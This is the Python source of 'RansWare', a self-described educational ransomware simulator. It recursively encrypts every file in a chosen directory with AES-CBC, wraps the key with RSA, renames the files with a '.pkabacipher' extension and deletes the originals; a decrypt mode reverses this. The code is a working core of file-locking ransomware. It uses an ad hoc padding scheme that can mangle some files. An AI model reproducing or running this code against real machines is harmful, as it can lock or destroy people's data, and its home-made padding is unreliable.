"""
Coded By Alexis Pondo
Github: http://github.com/alexispondo/
Linkedin: https://www.linkedin.com/in/alexis-pondo/

Note: This program is intended for educational purposes, indeed it was written to understand how ransomware works, how the underlying encryption works and how it spreads on a machine.
      I am in no way responsible for anything you do with it.

Usage:
    1) generate the key pair
        >> python3 RansWare.py gen_key
    2) encryption
        >> python3 RansWare.py enc --dir "/home/alexispondo/Downloads/PHP-master library (copy 1)" --pub_key /home/alexispondo/HACK_LOG/PERSO/ransomware/public
    3) decription
        >> python3 RansWare.py dec --dir "/home/alexispondo/Downloads/PHP-master library (copy 1)" --priv_key /home/alexispondo/HACK_LOG/PERSO/ransomware/private

"""


from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os
import random

import argparse
from termcolor import cprint


print_blue = lambda x: cprint(x, 'blue')
print_red = lambda x: cprint(x, "red")
print_green =  lambda x: cprint(x, "green")
print_yellow = lambda x: cprint(x, "yellow")
print_yellow_bold = lambda x: cprint(x, "yellow", attrs=['bold'])
print_red_bold = lambda x: cprint(x, "red", attrs=['bold'])


def banner():
    infos = """
    [+] Name: RansWare
    [+] Version: 1.0
    [+] Github: https://github.com/alexispondo/RansWare
    [+] Linkedin: https://www.linkedin.com/in/alexis-pondo/
    """
    var1 = """
 ██▀███   ▄▄▄       ███▄    █   ██████  █     █░ ▄▄▄       ██▀███  ▓█████ 
▓██ ▒ ██▒▒████▄     ██ ▀█   █ ▒██    ▒ ▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀ 
▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒░ ▓██▄   ▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   
▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒  ▒   ██▒░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ 
░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░▒██████▒▒░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒
░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░
  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░  ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░
  ░░   ░   ░   ▒      ░   ░ ░ ░  ░  ░    ░   ░    ░   ▒     ░░   ░    ░   
   ░           ░  ░         ░       ░      ░          ░  ░   ░        ░  ░
"""+infos+"""
    """

    var2 = """
 ______     ______     __   __     ______     __     __     ______     ______     ______    
/\  == \   /\  __ \   /\ "-.\ \   /\  ___\   /\ \  _ \ \   /\  __ \   /\  == \   /\  ___\   
\ \  __<   \ \  __ \  \ \ \-.  \  \ \___  \  \ \ \/ ".\ \  \ \  __ \  \ \  __<   \ \  __\   
 \ \_\ \_\  \ \_\ \_\  \ \_\\"\_\  \/\_____\  \ \__/".~\_\  \ \_\ \_\  \ \_\ \_\  \ \_____\ 
  \/_/ /_/   \/_/\/_/   \/_/ \/_/   \/_____/   \/_/   \/_/   \/_/\/_/   \/_/ /_/   \/_____/ 
                                                                                            
"""+infos+"""
    """

    var3 = """
 .S_sSSs     .S_SSSs     .S_sSSs      sSSs   .S     S.    .S_SSSs     .S_sSSs      sSSs  
.SS~YS%%b   .SS~SSSSS   .SS~YS%%b    d%%SP  .SS     SS.  .SS~SSSSS   .SS~YS%%b    d%%SP  
S%S   `S%b  S%S   SSSS  S%S   `S%b  d%S'    S%S     S%S  S%S   SSSS  S%S   `S%b  d%S'    
S%S    S%S  S%S    S%S  S%S    S%S  S%|     S%S     S%S  S%S    S%S  S%S    S%S  S%S     
S%S    d*S  S%S SSSS%S  S%S    S&S  S&S     S%S     S%S  S%S SSSS%S  S%S    d*S  S&S     
S&S   .S*S  S&S  SSS%S  S&S    S&S  Y&Ss    S&S     S&S  S&S  SSS%S  S&S   .S*S  S&S_Ss  
S&S_sdSSS   S&S    S&S  S&S    S&S  `S&&S   S&S     S&S  S&S    S&S  S&S_sdSSS   S&S~SP  
S&S~YSY%b   S&S    S&S  S&S    S&S    `S*S  S&S     S&S  S&S    S&S  S&S~YSY%b   S&S     
S*S   `S%b  S*S    S&S  S*S    S*S     l*S  S*S     S*S  S*S    S&S  S*S   `S%b  S*b     
S*S    S%S  S*S    S*S  S*S    S*S    .S*P  S*S  .  S*S  S*S    S*S  S*S    S%S  S*S.    
S*S    S&S  S*S    S*S  S*S    S*S  sSS*S   S*S_sSs_S*S  S*S    S*S  S*S    S&S   SSSbs  
S*S    SSS  SSS    S*S  S*S    SSS  YSS'    SSS~SSS~S*S  SSS    S*S  S*S    SSS    YSSP  
SP                 SP   SP                                      SP   SP                  
Y                  Y    Y                                       Y    Y                   
    
"""+infos+"""
    """
    return random.choice([var1, var2, var3])

# convert from bytes to hexadecimal
def bytes_to_hex(b):
    return b.hex()

# convert from hexadecimal to bytes
def hex_to_bytes(h):
    return bytes.fromhex(h)



#############################################################################################################################
################################################## Symetric Cryptography ####################################################
#############################################################################################################################

# Password generation function for symmetric encryption
def gen_passw():
    key = os.urandom(32) # random password
    return key #return password

# Initialization vector generation function
def gen_init_vector():
    iv = os.urandom(16) # random initialization vector
    return iv # return initialization_vector


# Function to know if the length of the message is a multiple of the length of the blocks (we use the length of the initialization vector (iv) because it is the first block)
# This function takes in parameter the initialization vector (iv) and the message to encrypt (data)
def make_mult_iv(iv, data):
    if len(data) < len(iv): # We check if the length of the message is less than the length of the initialization vector
        rest = len(iv) - len(data) # In this case, the number of characters to add to obtain the multiplicity is equal to the subtraction: len(iv) - len(data).
        # We add a number "@" equivalent to the length of iv to know if an addition has been made during decryption
        # (the number "@" is equivalent to the length of "iv" to ensure that the multiplicity is always respected)
        # we use b"" because we expect data in bytes
        delimiteur = b""  # Initializes the delimiter
        for k in range(len(iv)):
            delimiteur = delimiteur + b"@"  # we add the characters

        reste_letter = b""  # Initialize the rest of the letter
        for i in range(rest):
            reste_letter = reste_letter + b"$"  # we add the characters
        return data + delimiteur + reste_letter  # return a message containing the initial message, the delimiter and added characters to ensure multiplicity
    else:
        rest = len(data) % len(iv) # Otherwise, we determine the rest of the division: len(data) % len(iv)
        if rest == 0: # We check if the length of the message is a multiple of the length of the initialization vector
            return data# In this case we return the message as it is
        else: # If not
            # We add a number "@" equivalent to the length of iv to know if an addition has been made during decryption
            # (the number "@" is equivalent to the length of "iv" to ensure that the multiplicity is always respected)
            # we use b"" because we expect data in bytes
            delimiteur = b"" # Initializes the delimiter
            for k in range(len(iv)):
                delimiteur = delimiteur + b"@" # we add the characters

            # This loop allows to add a number of character "$" equal to the subtraction between the length of iv and the rest of the division of len(data) by len(iv) always in order to ensure the multiplicity
            nbr_lettre_a_ajouter = len(iv) - rest # Number of letters to add
            reste_letter = b"" # Initialize the rest of the letter
            for i in range(nbr_lettre_a_ajouter):
                reste_letter = reste_letter + b"$" # we add the characters
            return data + delimiteur + reste_letter # return a message containing the initial message, the delimiter and added characters to ensure multiplicity


# Allows you to retrieve the original message
def get_original_data(iv, data):
    delimiter = b"" # Initializes the delimiter
    for i in range(len(iv)):
        delimiter = delimiter + b"@" # we add the characters

    a = data
    # The following conditions allow to check if an addition has been made during the encryption
    if delimiter in data:
        if b"$" in data.split(delimiter)[-1]:
            a = delimiter.join(data.split(delimiter)[:-1]) # We use "delimiter.join(data.split(delimiter)[0])" instead of "data.split(delimiter)[0]" to make sure that even if a delimiter existed in the original text it is still taken into consideration
    return a # We return the original message

# Symmetric encryption function takes as parameters the file to encrypt, the public key to encrypt asymmetrically, the password of the symmetric encryption and the password
def sym_cipher_data(file, public_key, key_mdp):

    # initialization vector
    init_v = gen_init_vector()

    # We create our cryptor :)
    cipher = Cipher(
        algorithms.AES(key_mdp),
        modes.CBC(init_v)
    )

    # We load our public key to make it usable (deserialization)
    pub_k = load_public_key(public_key)

    # We asymmetrically encrypt the password with the public key
    ciphertext_pass = pub_k.encrypt(
        key_mdp,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # We recover the information to be encrypted
    with open(file, "rb") as f:
        data = f.read()
        data = make_mult_iv(init_v, data) # We check the multiplicity between the length of the message and that of the initialization vector (we return a message whose length is multiple of the length of the iv)

    # We encrypt the recovered data using our encryptor
    data_crypte = cipher.encryptor().update(data) + cipher.encryptor().finalize()

    # we add the initialization vector and the encrypted password to the file
    # we transform the bytes into hexadecimal
    data_and_init_vector = bytes_to_hex(data_crypte) + "pkabacipher" + bytes_to_hex(init_v) + "pkabacipher" + bytes_to_hex(ciphertext_pass)

    # We save the encrypted information in a file with the same name by adding the extension ".pkabacipher".
    new_file = file + ".pkabacipher"
    with open(new_file, "w") as nf:
        nf.write(data_and_init_vector)

    # Delete the old file
    os.remove(file)

# Symmetric decryption function it takes as parameter the encrypted file and the private key
def sym_decipher_data(file_cipher, private_key):

    # We load the private key
    priv_k = load_private_key(private_key)

    # We open the symetrically encrypted file containing the initialization vector and the encrypted mdp
    with open(file_cipher, "r") as f:
        file_and_init = f.read()


    # We recover each part of the encrypted file
    file = hex_to_bytes(file_and_init.split("pkabacipher")[0]) # The content of the original encrypted file
    plaintext_iv = hex_to_bytes(file_and_init.split("pkabacipher")[1]) # The initialization vector to decrypt this file
    key = hex_to_bytes(file_and_init.split("pkabacipher")[2]) # The password to decrypt this file

    # We decipher the password
    plaintext_key = priv_k.decrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    #######################################################################


    # We create our decryptor :)
    cipher = Cipher(
        algorithms.AES(plaintext_key),
        modes.CBC(plaintext_iv)
    )

    # We decrypt the recovered data using our decryptor
    plaintext_file = cipher.decryptor().update(file)+cipher.decryptor().finalize()

    # We retrieve the original message
    plaintext_file = get_original_data(plaintext_iv, plaintext_file)

    # We save the deciphered information in a file with the initial name i.e. by removing the ".pkabacipher" extension
    new_file = ".".join(str(file_cipher).split(".")[:-1])
    with open(new_file, "wb") as nf:
        nf.write(plaintext_file)

    # We delete the encrypted file
    os.remove(file_cipher)

#############################################################################################################################
#############################################################################################################################
#############################################################################################################################







#############################################################################################################################
################################################# Asymetric Cryptography ###################################################
#############################################################################################################################

# We generate a private/public key of size "size" (by default 4096)
def generer_private_key(size = 4096):
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=int(size),
    )
    return private_key

# Function to load a private key (deserialize it)
def load_private_key(private_key_file):
    with open(private_key_file, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            #password=b'mypassword',
            password=None,
        )
    return private_key

# Function to save a private key (serialize it)
def serialize_private_key(private_key, output):
    pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        #encryption_algorithm=serialization.BestAvailableEncryption(b'mypassword')
        encryption_algorithm=serialization.NoEncryption()
    )
    with open(output, "wb") as private_key:
        private_key.write(pem)

# Function to extract the public key from the private/public key
def get_public_key(private_key):
    public_key = private_key.public_key()
    return public_key

# Function to save public key (serialize it)
def serialize_public_key(public_key, output):
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    with open(output, "wb") as public_key:
        public_key.write(pem)

# Function to load a public key (deserialize it)
def load_public_key(public_key_file):
    with open(public_key_file, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read()
        )
    return public_key

# Asymmetric encryption function taking as parameters the public key and the file to encrypt (Function not used)
# Because there is a limit on the size of files to encrypt / decrypt, the size of the file must not be greater than the length of the key
def ch(public_key, file):
    with open(file, "rb") as f:
        message = f.read()
    ciphertext = public_key.encrypt(
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    new_file = file + ".pkabacipher"
    with open(new_file, "wb") as nf:
        nf.write(ciphertext)
    os.remove(file)

# Asymmetric decryption function taking as parameters the private key and the file to decrypt (Function not used)
# Because there is a limit on the size of files to encrypt / decrypt, the size of the file must not be greater than the length of the key
def dech(private_key, file):
    with open(file, "rb") as f:
        ciphertext = f.read()
    plaintext = private_key.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    new_file = "".join(str(file).split(".")[:-1])
    with open(new_file, "wb") as nf:
        nf.write(plaintext)
    os.remove(file)

#############################################################################################################################
#############################################################################################################################
#############################################################################################################################

def crypter(dir, public_key_file, mdp):
    if os.path.isdir(dir): # Does the directory exist?
        for (current_dir, list_dir, files) in os.walk(dir): # If YES, the folders and files contained in the current folder are listed
            for f in files:
                path_file = current_dir + "/" + f
                print(path_file) # We display the files
        print("\nThe listed files will be encrypted. Do you want to continue ?")
        continuer = str(input("Y/N >> ")) # Request to continue
        if continuer.lower() == "y": # If yes
            print("\nStart of the encryption...\n")
            for (current_dir, list_dir, files) in os.walk(dir): # The folders and files contained in the current folder are listed
                for f in files:
                    path_file = current_dir + "/" + f
                    print_blue("Old = {}".format(path_file))
                    try:
                        sym_cipher_data(path_file, public_key_file, mdp) # We encrypt the files
                        path_file_c = path_file + ".pkabacipher"
                        print_green("New = {}".format(path_file_c))
                    except Exception as e:
                        print(e)
            print("\nEnd of encryption...")
        else:
            print("\nEncryption cancelled...")
    else:
        print("\nSorry you entered a non-existent file :(")

def decrypter(dir, private_key_file):
    if os.path.isdir(dir): # Does the directory exist?
        for (current_dir, list_dir, files) in os.walk(dir): # If YES, the folders and files contained in the current folder are listed
            for f in files:
                path_file = current_dir + "/" + f
                print(path_file) # # We display the files
        print("\nListed files will be decrypted (make sure you have the \".pkabacipher\" extension before decrypting them). Do you want to continue ?")
        continuer = str(input("Y/N >> ")) # Demande pour continuer
        if continuer.lower() == "y": # Si OUI
            print("\nStart of the deciphering...\n")
            for (current_dir, list_dir, files) in os.walk(dir): # The folders and files contained in the current folder are listed
                for f in files:
                    path_file = current_dir + "/" + f
                    print_blue("Old = {}".format(path_file))
                    try:
                        sym_decipher_data(path_file, private_key_file) # We decipher the files
                        path_file_c = ".".join(str(path_file).split(".")[:-1])
                        print_green("New = {}".format(path_file_c))
                    except Exception as e:
                        print(e)
            print("\nEnd of the deciphering...")
        else:
            print("\nDeciphering cancelled...")
    else:
        print("\nSorry you entered a non-existent file :(")


parser = argparse.ArgumentParser(description="File encryption/decryption system simulating ransonware")
subparser = parser.add_subparsers(dest='command')

gen_key = subparser.add_parser('gen_key',help="Generate a key pair: (private key/public key)") # Choose to generate a private/public key pair
enc = subparser.add_parser('enc', help="Encrypt files in a directory recursively") # Choose to do the encryption
dec = subparser.add_parser('dec', help="Decrypt files in a directory recursively") # Choose to do the decryption

enc.add_argument("--dir", type=str, required=True, help="Specify the directory path from which to start the encryption") # Specify the encryption root folder
enc.add_argument("--pub_key", type=str, required=True, help="Specify the path of the public key during encryption") # Specify the public key for encryption

dec.add_argument("--dir", type=str, required=True, help="Specify the directory path from which to start decryption") # Specify the decryption root folder
dec.add_argument("--priv_key", type=str, required=True, help="Specify the path of the private key for decryption") # Specify the private key for decryption


args = parser.parse_args()
print_yellow_bold(banner())
if args.command == 'gen_key':
    print('Key generation...')

    serialize_private_key(generer_private_key(4096),"private")
    print("\nPrivate Key: {}".format(os.getcwd() + "/private"))
    print("####################################################################################")
    with open("private", "r") as pri:
        print(pri.read())
    print("####################################################################################")


    serialize_public_key(get_public_key(load_private_key("private")),"public")
    print("\nPublic Key: {}".format(os.getcwd() + "/public"))
    print("####################################################################################")
    with open("public", "r") as pub:
        print(pub.read())
    print("####################################################################################")

    print("\n==== The key pair has been generated ==== \nGeneration completed... ")

elif args.command == 'enc':
    dir = args.dir # We get directory
    pub_key = args.pub_key # We get public key
    mdp = gen_passw()  # We generate our password randomly for symmetric encryption
    crypter(dir, pub_key, mdp) # We crypt files
elif args.command == 'dec':
    dir = args.dir # We get directory
    priv_key = args.priv_key # We get private key
    decrypter(dir,priv_key) # We decrypt files